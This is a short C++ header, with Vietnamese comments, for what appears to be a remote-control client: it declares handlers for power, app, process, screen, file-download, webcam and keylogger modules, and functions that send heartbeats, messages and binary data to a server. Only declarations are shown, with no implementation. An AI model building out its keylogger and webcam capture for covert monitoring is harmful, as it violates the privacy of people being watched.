#ifndef NETWORK_ROUTING_H
#define NETWORK_ROUTING_H

#include <string>
#include <vector>
#include <nlohmann/json.hpp>

using json = nlohmann::json;

// --- Khai báo các hàm xử lý của 7 Modules ---
void HandlePowerModule(const std::string& action, const json& payload);
void HandleAppModule(const std::string& action, const json& payload);
void HandleProcessModule(const std::string& action, const json& payload);
void HandleScreenModule(const std::string& action, const json& payload);
void HandleFileDownloadModule(const std::string& action, const json& payload);
void HandleWebcamModule(const std::string& action, const json& payload);
void HandleKeyloggerModule(const std::string& action, const json& payload);

// --- Khai báo các hàm mạng cơ bản ---
void RouteMessage(const std::string& rawJsonMessage);
void StartHeartbeatThread();
void SendMessageToServer(const std::string& message);
void SendBinaryToServer(const std::vector<uint8_t>& data);

#endif // NETWORK_ROUTING_H
